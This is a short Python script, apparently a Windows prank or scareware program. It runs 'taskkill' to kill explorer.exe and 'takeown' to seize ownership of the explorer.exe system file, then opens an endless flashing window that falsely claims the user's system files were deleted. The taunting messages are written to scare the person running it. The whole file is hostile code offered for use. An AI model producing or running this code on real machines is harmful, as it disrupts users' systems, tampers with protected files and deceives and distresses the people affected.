import os
import time
from turtle import *
import turtle
system32 = "C:\\Windows\\System32"
def malicious_shit():

    try :
         os.popen("taskkill /F /IM explorer.exe")
         os.popen("takeown /f C:\\Windows\\explorer.exe")
        
    except OSError :
         print("Check your permissions stupid")
         input("Press any key to exit")
         exit(0)
    except KeyboardInterrupt:
         print("Coward 🤣🫵")
         input("Press any key to exit")
         exit(0)
malicious_shit()
def graphics():
        screen = turtle.Screen()
        screen.bgcolor("black")
        screen.title("UH OH UR FILES ARE GONIE GONE :)")
        screen.setup(width=800, height=600)
    
        writer = turtle.Turtle()
        writer.hideturtle()
        writer.speed(0)
        writer.penup()
        writer.goto(0, 0)  

        colors = ["red", "orange", "yellow", "lime", "cyan", "violet"]

        def flash_text():
            # Rotate colors
            current_color = colors.pop(0)
            colors.append(current_color)
        
        
            writer.clear()
            writer.color(current_color)
            writer.write("POOPY BABY I DELETED UR SYSTEM FILES :)", 
                    align="center", 
                    font=("Comic Sans MS", 32, "bold"))
        
        
            screen.ontimer(flash_text, 500)

    
        flash_text()
        screen.mainloop()
        turtle.done
while True:
        graphics()
malicious_shit()
